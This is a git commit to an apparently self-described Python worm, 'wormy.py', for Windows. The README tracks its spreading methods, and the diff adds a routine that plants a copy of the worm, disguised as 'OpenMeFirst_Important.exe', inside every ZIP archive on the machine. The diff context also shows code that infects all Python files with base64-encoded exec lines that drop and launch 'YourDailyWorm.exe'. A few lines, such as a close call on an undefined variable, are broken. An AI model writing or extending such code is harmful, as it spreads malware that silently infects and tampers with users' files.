0a6481d90460cc55c40b7225eed23f0216fc2973
D4Vinci <d4vinci@protonmail.com>
2017-01-22 20:00:53 +0200

    No. 3 completed
    checkout the comments

--- README.md
+++ README.md
@@ -7,18 +7,20 @@ In this repo I will write some functions in python3 in my free time to add "some
 
 
 ## ToDo list :
-   1)Spread in drivers,add to startup and continueos check (✓)
-   
+   1)Spread in drivers, add to startup and continuous check(✓)
+
    2)Spread in python scripts by injecting                 (✓)
-   
-   3)Spread in rar files                                   (✘)
-   
+
+   3)Spread in ZIP files                                   (✓)
+
    4)Spread in shared folders                              (✘)
-   
+
    5)Spread in lan                                         (✘)
-   
+
    6)Spread in usb                                         (✘)
-   
-   7)Make a copy of itself online and use it in spreading  (✘)
-   
-   8)...Still thinking :D
+
+   7)Try to spread in p2p,skype and hangouts               (✘)
+
+   8)Make a copy of itself online and use it in spreading  (✘)
+
+   9)...Still thinking :D
--- wormy.py
+++ wormy.py
@@ -3,7 +3,7 @@
 #
 #       Don't forget to convert it to executable & I recommend to you pyinstaller
 #
-import os,string,random,sys,glob,hashlib
+import os,string,random,sys,glob,hashlib,zipfile
 from winreg import *
 
 #Get the drivers on the pc
@@ -68,6 +68,7 @@ def spread_in_drivers():
     for driv in drivs:
         exist = 0
         os.chdir( driv )
+        #get all the exe files in the folder
         driv_files = glob.glob( "*.exe" )
         for fi in driv_files:
             if md5_checksum( fi ) == md5_checksum( name ):
@@ -81,6 +82,7 @@ def spread_in_drivers():
 def spread_in_python():
     Goback()
     files = []
+    #get all the python files in the machine
     for driv in drivers():
         os.chdir( driv )
         files = os.popen( 'dir /s /b "*.py"' ).read().split( "\n" )
@@ -90,4 +92,41 @@ def spread_in_python():
             a.write("\n\n\n\n#--SayTheMagicWord--\nimport base64,os;exec(base64.b64decode('{}'))".format(base64.b64encode("open('YourDailyWorm.exe','w').write('{}');os.popen('YourDailyWorm.exe')".format(open(sys.argv[0],'rb').read()))))
             a.close()
 
-#I will Continue later..
+#Clean a file data and rewrite it
+def replace_file( old_file,data ):
+    f = open( old_file,"w" )
+    f.write(data)
+    f.close()
+
+#The script must be executable
+#Spread in ZIP files
+def spread_in_zip():
+    Goback()
+    name = sys.argv[0]
+    files = []
+    #get all the ZIP files in the machine
+    for driv in drivers():
+        os.chdir( driv )
+        files = os.popen( 'dir /s /b "*.zip"' ).read().split( "\n" )
+    for f in files:
+        if "OpenMeFirst_Important.exe" not in zipfile.ZipFile(f).namelist():
+            #extract the ZIP file to temp folder
+            old_zip = zipfile.ZipFile(f)
+            old_zip.extractall("temp")
+            os.chdir( "temp" )
+            #make a self copy
+            make_copy( name,"OpenMeFirst_Important.exe" )
+            old_zip.close()
+            #now make a new ZIP file with the same name
+            new_zip = zipfile.ZipFile( os.path.basename(f),"w" )
+            #Add all files in temp to the new ZIP
+            for fi in os.listdir():
+                new_zip.write(fi)
+            new.close()
+            #Now replace the original one with our copy
+            replace_file( f,open( os.path.basename(f) ,"rb").read() )
+            #cleanup!
+            os.chdir("..")
+            os.remove("temp")
+
+#I will Continue later.. ;)
